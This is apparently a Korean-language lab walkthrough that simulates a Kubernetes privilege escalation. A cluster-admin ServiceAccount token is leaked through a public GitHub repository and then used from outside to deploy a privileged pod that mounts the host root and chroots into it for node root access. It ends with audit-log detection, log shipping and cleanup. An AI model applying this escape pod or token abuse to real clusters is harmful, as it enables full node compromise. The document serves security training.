# Kubernetes Privilege-Escalation 시나리오

> **목표** : 유출된 ServiceAccount 토큰으로 API 침투 → `privileged` 컨테이너 배포 → 노드 **root** 권한 획득

---

## 0. 실습 클러스터

| 구성            | 수량                   |
| ------------- | -------------------- |
| Control-Plane | 1 대 (k8s-master)     |
| Worker        | 3 대 (k8s-work1 \~ 3) |
| Kubernetes    | v1.33.x (최신)         |

---

## 1. 사전 준비 (마스터 노드)

### 1‑1 ServiceAccount & 토큰 발급 (24 h)

```bash
kubectl -n kube-system create sa demo-leak
kubectl create clusterrolebinding demo-leak \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:demo-leak

kubectl -n kube-system create token demo-leak --duration=24h \
  > /tmp/leak.token
```

### 1‑2 API 포트 오픈 (6443/TCP)

| 항목            | 값                     |
| ------------- | --------------------- |
| Name          | `allow-demo-6443`     |
| Direction     | Ingress               |
| Source IP     | `<YOUR_PUBLIC_IP>/32` |
| Protocol/Port | `tcp:6443`            |

### 1‑3 토큰 내용 확인

```bash
cat /tmp/leak.token
```

---

## 2. 토큰 유출 시뮬레이션 (GitHub Public Repo)

```bash
mkdir ~/demo-leak && cd ~/demo-leak
echo "## 토큰 유출 테스트" > README.md
cat /tmp/leak.token >> README.md
git init
git remote add origin git@github.com:<USER>/demo-leak.git
git add README.md && git commit -m "leak kube token"
git push -u origin main
```

---

## 3. 공격 단계 (외부 PC)

```bash
# kubectl 설치 (macOS 예시)
brew install kubectl

# 환경변수
TOKEN="$(curl -s https://raw.githubusercontent.com/<USER>/demo-leak/main/README.md | tail -1)"
API="https://34.64.60.22:6443"

# 인증 성공 테스트
kubectl --token "$TOKEN" --server "$API" --insecure-skip-tls-verify get ns
```

### 3‑1 privileged Pod YAML 작성

`privileged-shell.yaml`

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: privileged-poc
---
apiVersion: v1
kind: Pod
metadata:
  name: privileged-shell
  namespace: privileged-poc
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: attacker-shell
    image: alpine:latest
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
```

**배포 & 쉘 획득**

```bash
kubectl --token "$TOKEN" --server "$API" \
  --insecure-skip-tls-verify apply -f privileged-shell.yaml

kubectl --token "$TOKEN" --server "$API" \
  --insecure-skip-tls-verify -n privileged-poc exec -it privileged-shell -- sh

# 노드 root 전환
chroot /host /bin/bash
whoami   # → root
```

---

## 4. (선택) 감사 로그 활성화 — 탐지용

### 4‑1 정책 파일 `/etc/kubernetes/audit-policy.yaml`

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: RequestResponse
```

### 4‑2 kube‑apiserver 매니페스트 수정 `/etc/kubernetes/manifests/kube-apiserver.yaml`

```yaml
# command 플래그
- --audit-policy-file=/etc/kubernetes/audit-policy.yaml
- --audit-log-path=/var/log/kubernetes/audit.log
- --audit-log-maxage=30
- --audit-log-maxbackup=10
- --audit-log-maxsize=100

# volumeMounts
- name: audit-policy
  mountPath: /etc/kubernetes/audit-policy.yaml
  readOnly: true
- name: audit-logs
  mountPath: /var/log/kubernetes

# volumes
- name: audit-policy
  hostPath:
    path: /etc/kubernetes/audit-policy.yaml
    type: File
- name: audit-logs
  hostPath:
    path: /var/log/kubernetes
    type: DirectoryOrCreate
```

### 4‑3 로그 확인

```bash
tail -f /var/log/kubernetes/audit.log
```

---

## 5. Vector 로그 수집 예시

| 대상          | 경로                              |
| ----------- | ------------------------------- |
| Audit       | `/var/log/kubernetes/audit.log` |
| 컨테이너 stdout | `/var/log/containers/*.log`     |

`vector.toml`

```toml
[sources.audit]
  type    = "file"
  include = ["/var/log/kubernetes/audit.log"]

[sources.containers]
  type    = "file"
  include = ["/var/log/containers/*.log"]

[sinks.loki]
  type     = "loki"
  inputs   = ["audit", "containers"]
  endpoint = "http://loki.example.com:3100"
```

---

## 6. 정리 (Cleanup)

```bash
# 외부 PC
kubectl delete -f privileged-shell.yaml
kubectl delete ns privileged-poc

# 마스터 노드
kubectl -n kube-system delete sa demo-leak
kubectl delete clusterrolebinding demo-leak

# GCP 방화벽
gcloud compute firewall-rules delete allow-demo-6443
```

